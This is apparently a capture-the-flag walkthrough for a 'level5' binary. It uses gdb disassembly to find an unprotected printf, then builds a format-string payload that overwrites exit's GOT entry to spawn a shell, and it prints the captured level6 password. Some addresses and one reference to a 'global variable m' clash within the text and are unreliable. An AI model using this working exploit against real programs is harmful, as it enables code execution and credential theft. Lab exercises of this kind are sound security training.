Execute the *level5* binary:

```bash
./level5
abcd
```

```
abcd
```

> Note the *level5* binary reads the user input from stdin like the *level4*, *level3*, *level2* and *level1*.

```gdb
disass main
```

> Use __set disassembly-flavor intel__ command to set the intel syntax.

```gdb
Dump of assembler code for function main:
   0x080484a7 <+0>:	    push   ebp
   0x080484a8 <+1>:	    mov    ebp,esp
   0x080484aa <+3>:	    and    esp,0xfffffff0
   0x080484ad <+6>:	    call   0x8048457 <n>
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret
End of assembler dump.
```

Check the *n* function called from the main:

```gdb
disass n
```

```
Dump of assembler code for function n:
...
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>    ; get the user input
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>   ; print the user input
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>     ; call the exit function
End of assembler dump.
```

> Note the *exit* function is linked dynamically (*@plt*).

Check for interisting functions:

```gdb
info functions
```

```
All defined functions:

...
0x080484a4  o
0x080484c2  n
0x08048504  main
...
```

Check the *o* function:

```gdb
disass o
```

```
Dump of assembler code for function o:
...
   0x080484aa <+6>:	    mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>       ; execute "/bin/sh"
...
End of assembler dump.
```

This function *o* at the address __0x080484a4__ is now the goal.

Like previous levels, the *printf* call is not protected, and because the next call to *exit* is dynamic, it's possible to overwrite the address called for the *exit* function to the *o* function with a [got overwrite](https://infosecwriteups.com/got-overwrite-bb9ff5414628) function.

To do this, need to replace the address called by the *exit@plt* at its first instruction, by the address of the *o* function:

```gdb
x/4i 0x80483d0
```

```
0x80483d0 <exit@plt>:	            jmp    DWORD PTR ds:0x8049838
0x80483d6 <exit@plt+6>:	            push   0x28
0x80483db <exit@plt+11>:	        jmp    0x8048370
0x80483e0 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804983c
```

The address of the first jump instruction of *exit@plt* to replace is __0x8049838__.

> Not this address is stored in the *.got.plt* section (*info file*).

Check where is the first argument of printf in the stack:

```bash
echo "AAAABBBBCCCC %p %p %p %p %p %p %p %p" | ./level5
```

```
AAAABBBBCCCC 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x42424242 0x43434343 0x20702520 0x25207025
```

> The fourth parameter of the *printf* is the first character of the user input buffer (because AAAA = 0x41414141, BBBB = 0x42424242 ...)

- Put the address of the first jump instruction of the *exit@plt* at the beginning of the user input (reversed because the stack is readed in the opposite way = \x38\x98\x04\x08) for the *fgets* call.
- Add 134513824 (134513828 minus the global variable *m* address) padding characters/bytes using the *%d* format specifier for the *0x080484A4* address of the *o* function in hexadecimal.
- Add the *%n* special format specifier to put the value previous described 134513828.
- Use the *%4$...* permutation option on the *%n* special format specifier for write its value (134513828) in the fourth parameter of printf which is the start of the user input buffer.

```bash
(echo -e "\x38\x98\x04\x08%134513824d%4\$n" ; cat) | ./level5
cat /home/user/level6/.pass
```

```
...
                                                                 512
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```